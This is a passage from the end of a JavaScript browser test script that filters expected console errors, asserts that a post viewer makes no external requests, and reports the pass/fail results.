      if (/\/posts\//.test(p.where) && /Failed to load resource|net::ERR_FAILED|ERR_BLOCKED/.test(p.text) && !/CSP-VIOLATION/.test(p.text)) return false;
      // the deliberate 404s / broken files of the error-state tests
      if (/Failed to load resource: the server responded with a status of 404/.test(p.text)) return false;
      return true;
    });
    assert.deepEqual(problems, []);
    const ext = externalRequests.filter((r) => !r.label.startsWith('post-'));
    assert.deepEqual(ext, [], 'the viewer made no external requests');
  });

  await browser.close();
  await server.close();

  const failed = results.filter((r) => !r.ok);
  console.log(`\n${results.length - failed.length}/${results.length} passed. Screenshots: ${SHOTS}`);
  if (failed.length) process.exitCode = 1;
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
